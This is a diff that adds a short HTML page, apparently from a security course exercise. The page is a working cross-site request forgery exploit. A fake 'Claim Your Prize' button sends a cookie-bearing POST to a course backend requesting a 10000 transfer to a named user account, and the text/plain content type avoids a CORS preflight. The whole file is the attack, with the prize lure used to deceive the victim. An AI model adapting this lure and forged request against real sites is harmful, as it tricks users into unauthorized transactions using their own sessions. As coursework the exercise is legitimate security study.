@@ -1,0 +1,28 @@
+<html>
+<body>
+  <h1>Congratulations! Click below to win a prize.</h1>
+  <button id="submitButton">Claim Your Prize</button>
+
+  <script>
+    document.getElementById('submitButton').addEventListener('click', function () {
+      fetch('https://cse543.aranjbar.me/backend/tfourtwo', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'text/plain;charset=UTF-8'
+        },
+        body: JSON.stringify({
+          username: "ljl5837",
+          fname: "lks",
+          amount: "10000",
+          comment: "what's your name"
+        }),
+        credentials: 'include' // Ensures cookies are sent with the request
+      }).then(response => {
+        alert('Your prize is being processed!');
+      }).catch(error => {
+        alert('Oops! Something went wrong.');
+      });
+    });
+  </script>
+</body>
+</html>
